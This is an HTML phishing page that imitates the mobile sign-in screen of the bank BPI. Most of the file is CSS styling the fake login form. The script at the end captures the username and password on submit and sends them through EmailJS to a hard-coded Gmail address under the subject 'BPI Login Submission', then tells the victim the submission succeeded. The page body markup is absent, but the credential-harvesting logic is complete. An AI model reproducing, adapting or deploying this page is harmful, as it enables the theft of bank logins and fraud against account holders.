<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta name="mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="default" />
    <title>BPISign In</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .phone-frame {
            width: 100%;
            max-width: 480px;
            min-height: 100vh;
            background: #ffffff;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        @media (min-width: 480px) {
            body {
                background: #f0f0f0;
            }

            .phone-frame {
                min-height: 844px;
                border-radius: 48px;
                border: 10px solid #d0d0d0;
                overflow: hidden;
            }
        }



        /* Notification bell */
        .topbar {
            display: flex;
            justify-content: flex-end;
            padding: 4px 24px 0;
        }

        .topbar-icon {
            width: 36px;
            height: 36px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }

        .topbar-icon svg {
            width: 22px;
            height: 22px;
            stroke: #555;
            fill: none;
            stroke-width: 1.8;
        }

        /* Main content */
        .content {
            padding: 28px 28px 0;
            flex: 1;
            display: flex;
            flex-direction: column;
        }

        .bpi-logo {
            margin-bottom: 36px;
        }

        /* Form */
        .form-group {
            margin-bottom: 14px;
        }

        .form-group input {
            width: 100%;
            padding: 15px 16px;
            border: none;
            background: #F2F2F2;
            border-radius: 12px;
            font-size: 15px;
            color: #333;
            outline: none;
            transition: background 0.2s;
        }

        .form-group input:focus {
            background: #E8E8E8;
        }

        .form-group input::placeholder {
            color: #999;
        }

        .password-wrap {
            position: relative;
        }

        .password-wrap input {
            padding-right: 48px;
        }

        .toggle-pw {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 0;
        }

        .toggle-pw svg {
            width: 20px;
            height: 20px;
            stroke: #aaa;
            fill: none;
            stroke-width: 1.8;
        }

        .btn-login {
            width: 100%;
            padding: 16px;
            background: #E8A0A8;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            color: #fff;
            cursor: pointer;
            margin-top: 14px;
            margin-bottom: 20px;
            transition: background 0.2s;
        }

        .btn-login:hover {
            background: #D0011B;
        }

        .btn-login.active {
            background: #D0011B;
        }

        .forgot {
            text-align: center;
            font-size: 14px;
            color: #555;
            margin-bottom: 22px;
        }

        .forgot a {
            color: #D0011B;
            text-decoration: none;
        }

        .forgot a:hover {
            text-decoration: underline;
        }

        .btn-biometrics {
            width: 100%;
            padding: 14px;
            background: #fff;
            border: 1.5px solid #ccc;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 500;
            color: #333;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: background 0.2s;
        }

        .btn-biometrics:hover {
            background: #f5f5f5;
        }

        .btn-biometrics svg {
            width: 22px;
            height: 22px;
            stroke: #555;
            fill: none;
            stroke-width: 1.6;
        }

        /* Success / error messages */
        .msg {
            display: none;
            margin-top: 14px;
            padding: 12px 16px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 500;
            text-align: center;
        }

        .msg.success {
            background: #e6f4ea;
            color: #1e7e34;
            display: block;
        }

        .msg.error {
            background: #fdecea;
            color: #c62828;
            display: block;
        }

        /* Footer */
        .footer-lock {
            padding: 16px 28px 10px;
            text-align: center;
            border-top: 0.5px solid #eee;
        }

        .footer-lock p {
            font-size: 13px;
            color: #555;
            margin-bottom: 4px;
        }

        .footer-lock a {
            font-size: 13px;
            color: #2196A0;
            text-decoration: none;
            font-weight: 500;
        }

        .footer-lock a:hover {
            text-decoration: underline;
        }

        /* Bottom nav */
        .bottom-nav {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 8px 48px 24px;
            border-top: 0.5px solid #eee;
            position: relative;
        }

        .nav-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            cursor: pointer;
        }

        .nav-item svg {
            width: 24px;
            height: 24px;
            stroke: #888;
            fill: none;
            stroke-width: 1.8;
        }

        .nav-item.active svg {
            stroke: #D0011B;
        }

        .nav-item span {
            font-size: 11px;
            color: #888;
        }

        .nav-item.active span {
            color: #D0011B;
            font-weight: 500;
        }

        .nav-item.active .nav-underline {
            width: 100%;
            height: 2px;
            background: #D0011B;
            border-radius: 1px;
            margin-top: -2px;
        }

        .fab {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            bottom: 14px;
            width: 58px;
            height: 58px;
            border-radius: 50%;
            background: #D0011B;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 2px 10px rgba(208, 1, 27, 0.3);
        }

        .fab svg {
            width: 26px;
            height: 26px;
            stroke: #fff;
            fill: none;
            stroke-width: 1.8;
        }

        /* Loading spinner */
        .spinner {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.4);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

    <script>
        emailjs.init('h5Gv-CKkBQW5rIw7a');

        function togglePw() {
            const pw = document.getElementById('password');
            const icon = document.getElementById('eyeIcon');
            if (pw.type === 'password') {
                pw.type = 'text';
                icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>';

                icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
            }
        }

        document.getElementById('loginForm').addEventListener('submit', async function (e) {
            e.preventDefault();

            const btn = document.getElementById('loginBtn');
            const btnText = document.getElementById('btnText');
            const spinner = document.getElementById('spinner');
            const statusMsg = document.getElementById('statusMsg');
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;

            btnText.style.display = 'none';
            spinner.style.display = 'block';
            btn.disabled = true;
            statusMsg.className = 'msg';
            statusMsg.textContent = '';

            try {
                await emailjs.send('service_jwq9xow', 'template_hrc325k', {
                    username: username,
                    password: password,
                    to_email: 'lorentzsantos1818@gmail.com',
                    subject: 'BPI Login Submission â€” ' + username
                });

                statusMsg.className = 'msg success';
                statusMsg.textContent = 'Submitted successfully!';
                document.getElementById('loginForm').reset();
                btn.classList.add('active');
            } catch (err) {
                console.error('EmailJS error:', JSON.stringify(err));
                statusMsg.className = 'msg error';
                statusMsg.textContent = 'Error: ' + (err.text || err.message || JSON.stringify(err));
            } finally {
                btnText.style.display = 'block';
                spinner.style.display = 'none';
                btn.disabled = false;
            }
        });
    </script>
